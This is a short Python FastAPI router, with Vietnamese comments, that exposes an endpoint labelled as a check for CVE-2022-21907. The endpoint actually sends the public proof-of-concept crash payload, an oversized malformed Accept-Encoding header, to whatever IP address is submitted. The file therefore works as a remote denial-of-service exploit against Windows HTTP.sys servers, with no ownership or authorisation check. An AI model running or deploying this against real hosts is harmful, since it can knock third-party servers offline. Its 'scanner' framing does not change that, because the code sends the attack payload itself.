from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
import requests

router = APIRouter()

class Ip_Target(BaseModel):
    ip_address: str

tags_cve_2022_21907 = ['cve_2022_21907']

@router.post('/api/check-cve-2022-21907', tags=[tags_cve_2022_21907])
async def scan_host(host_data: Ip_Target):
    host = host_data.ip_address

    print("Sending specially crafted malicious requests, please wait...")
    
    # Đây là PoC
    headers = {
   'Accept-Encoding':
   'AAAAAAAAAAAAAAAAAAAAAAAA,\
	 BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S,\
	 RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF,\
	 TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP,\
	 OOOAOAOOOAOOAOOOAOOOAOOOAOO,\
	 ****************************stupiD, *, ,',
    }

    # Gửi request
    try: 
        reponse = requests.get(f'http://{host}', headers=headers) # Lấy payload ở PoC trên
        reponse.raise_for_status()
        return {"response_test": reponse.text}
    except requests.exceptions.RequestException as e:
        raise HTTPException(status_code=500,detail=f"An error occurred: {e}" )

    


    
    
    
         



